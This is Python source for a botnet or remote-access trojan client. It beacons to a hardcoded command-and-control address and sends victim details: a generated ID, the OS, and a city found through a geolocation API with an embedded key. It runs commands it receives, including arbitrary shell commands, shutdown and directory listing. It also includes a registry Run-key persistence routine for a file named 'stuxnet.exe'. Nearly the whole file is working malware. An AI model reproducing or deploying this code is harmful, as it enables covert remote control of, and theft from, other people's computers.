import socket
import struct
import os
import requests
import platform
import random
import string
from time import sleep
import subprocess
import pyautogui
import winreg

global API,IP,PORT,INTERVAL;
API = 'dcf3245cacb55b31045568f5a515cfb7'
IP = '192.168.43.223'
PORT = 2003
INTERVAL = 5

class Bot():
    def __init__(self):
        self.data = False
        # self.edit_registry('Software\Microsoft\Windows\CurrentVersion\Run','Services')

        self.s = socket.socket()

    def send_beacons(self):
        self.s.close()
        while True:
            try:
                s = socket.socket()
                print('[*] Sending beacon')
                s.connect((IP,PORT))
                if self.data:
                    s.send(self.data_pkt)
                    self.data = False
                    continue
                beacon = self.make_pkt(2)
                s.send(beacon)
                resp = s.recv(6000)
                print('[*] response received')
                self.unpack_resp(resp)
                sleep(INTERVAL)
            except Exception as e:
                print(e)
                pass

    def unpack_resp(self,pkt):
        code = '<H20s'
        isData = struct.unpack('<H',pkt[:2])
        if isData[0] == 1:
            cmd = struct.unpack('%ds'%(len(pkt)-2),pkt[2:])[0].decode().strip('*')
            print('[*] Command : {}'.format(cmd))
            resp_data = self.process_cmd(cmd)
            pkt = self.make_pkt(4,data=resp_data,cmd=cmd)
            self.data_pkt = pkt
            self.data = True
        else:
            pass

    def gen_key(self):
        key = ''
        if os.path.isfile('key.txt'):
            file = open('key.txt','r')
            key = file.read()
            file.close()
            return key
        for i in range(10):
            key += string.ascii_lowercase[random.randint(0,25)]
        with open('key.txt','w') as file:
            file.write(key)
            return key
    
    def initalize_bot(self):
        r = requests.get('http://api.ipstack.com/check?access_key={}'.format(API)).json()
        self.location = r['city']
        self.os = platform.platform()
        self.key = self.gen_key()

    def connect(self,ip,port):
        pkt = self.make_pkt(1)
        self.s.connect((ip,port))
        self.s.send(pkt)
        self.send_beacons()

    def edit_registry(self,reg_path,name):
        pwd = os.getcwd()
        path = pwd + '\\stuxnet.exe'

        # Path : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
        # reg_path = 'Software\Microsoft\Windows\CurrentVersion\Run'

        winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,reg_path)
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,reg_path,0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,name,0,winreg.REG_SZ,path)
        winreg.CloseKey(key)

    def make_pkt(self,typ,**kwargs):
        if typ == 1:
            code = '<10sH30s20s'
            pkt = struct.pack(code,self.key.encode(),
                                1,(self.os + '*'*(30-len(self.os))).encode(),
                                (self.location + '*'*(20-len(self.location))).encode())  
        elif typ == 2:
            code = '<10sHH'
            pkt = struct.pack(code,self.key.encode(),
                                2,INTERVAL)           

        elif typ == 4:
            code = '<10sHHH'
            pkt = struct.pack(code+'%ds%ds'%(len(kwargs['cmd']),len(kwargs['data'])),
                                self.key.encode(),
                                4,
                                len(kwargs['cmd']),
                                len(kwargs['data']),
                                (kwargs['cmd']).encode(),
                                kwargs['data'].encode())

        return pkt

    def process_cmd(self,cmd):
        if 'test' in cmd:
            resp = 'test_data'
        
        if 'dir' in cmd:
            cur_files = os.listdir()
            resp = ''
            for c in cur_files:
                resp += c + '\n' + '<br>'
        
        if 'shell' in cmd:
            cmd = cmd.strip('shell ')
            process = subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            stdout,stderr = process.communicate()
            resp = stdout.decode()

        if 'shutdown' in cmd:
            process = subprocess.Popen('shutdown',stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            stdout,stderr = process.communicate()
            resp = stdout.decode()
        
        if 'screenshot' in cmd:
            image = pyautogui.screenshot()
            # TODO process and send image
            pass
        
        else:
            resp = 'Unable to process Command'
        
        return resp

def main():
    b = Bot()
    b.initalize_bot()
    b.connect(IP,PORT)

if __name__ == '__main__':
    main()